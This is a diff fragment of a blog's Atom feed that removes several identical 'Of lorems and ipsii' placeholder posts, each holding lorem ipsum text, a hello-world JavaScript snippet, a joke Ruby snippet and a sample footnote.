-    <content type="html"><![CDATA[<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-
-<p>Some code:</p>
-
-<pre><code class="js">var hello = function (name) {
-  console.log("Hello, " + name + '.');
-}
-hello('World');   // prints 'Hello, World.' to stdout
-</code></pre>
-
-<!-- More -->
-
-
-<h2>Some more code</h2>
-
-<pre><code class="ruby">def test
-  @answer = 6*9
-  if @answer != 42  # this should never happen
-    raise "Oh no, not again."
-  else
-    print "Don't panic."
-end
-</code></pre>
-
-<h2>this is a sample header</h2>
-
-<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-<div class="footnotes">
-<hr/>
-<ol>
-<li id="fn:1">
-<p>The footnote <a href="http://www.example.com">content</a>.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
-</ol>
-</div>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Of lorems and ipsii]]></title>
-    <link href="http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-12/"/>
-    <updated>2014-12-22T16:04:23-08:00</updated>
-    <id>http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-12</id>
-    <content type="html"><![CDATA[<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-
-<p>Some code:</p>
-
-<pre><code class="js">var hello = function (name) {
-  console.log("Hello, " + name + '.');
-}
-hello('World');   // prints 'Hello, World.' to stdout
-</code></pre>
-
-<!-- More -->
-
-
-<h2>Some more code</h2>
-
-<pre><code class="ruby">def test
-  @answer = 6*9
-  if @answer != 42  # this should never happen
-    raise "Oh no, not again."
-  else
-    print "Don't panic."
-end
-</code></pre>
-
-<h2>this is a sample header</h2>
-
-<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-<div class="footnotes">
-<hr/>
-<ol>
-<li id="fn:1">
-<p>The footnote <a href="http://www.example.com">content</a>.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
-</ol>
-</div>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Of lorems and ipsii]]></title>
-    <link href="http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-11/"/>
-    <updated>2014-12-22T16:04:23-08:00</updated>
-    <id>http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-11</id>
-    <content type="html"><![CDATA[<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-
-<p>Some code:</p>
-
-<pre><code class="js">var hello = function (name) {
-  console.log("Hello, " + name + '.');
-}
-hello('World');   // prints 'Hello, World.' to stdout
-</code></pre>
-
-<!-- More -->
-
-
-<h2>Some more code</h2>
-
-<pre><code class="ruby">def test
-  @answer = 6*9
-  if @answer != 42  # this should never happen
-    raise "Oh no, not again."
-  else
-    print "Don't panic."
-end
-</code></pre>
-
-<h2>this is a sample header</h2>
-
-<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-<div class="footnotes">
-<hr/>
-<ol>
-<li id="fn:1">
-<p>The footnote <a href="http://www.example.com">content</a>.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
-</ol>
-</div>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Of lorems and ipsii]]></title>
-    <link href="http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-10/"/>
-    <updated>2014-12-22T16:04:23-08:00</updated>
-    <id>http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-10</id>
-    <content type="html"><![CDATA[<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-
-<p>Some code:</p>
-
-<pre><code class="js">var hello = function (name) {
-  console.log("Hello, " + name + '.');
-}
-hello('World');   // prints 'Hello, World.' to stdout
-</code></pre>
-
-<!-- More -->
-
-
-<h2>Some more code</h2>
-
-<pre><code class="ruby">def test
-  @answer = 6*9
-  if @answer != 42  # this should never happen
-    raise "Oh no, not again."
-  else
-    print "Don't panic."
-end
-</code></pre>
-
-<h2>this is a sample header</h2>
-
-<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-<div class="footnotes">
-<hr/>
-<ol>
-<li id="fn:1">
-<p>The footnote <a href="http://www.example.com">content</a>.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
-</ol>
-</div>
 
 ]]></content>
   </entry>
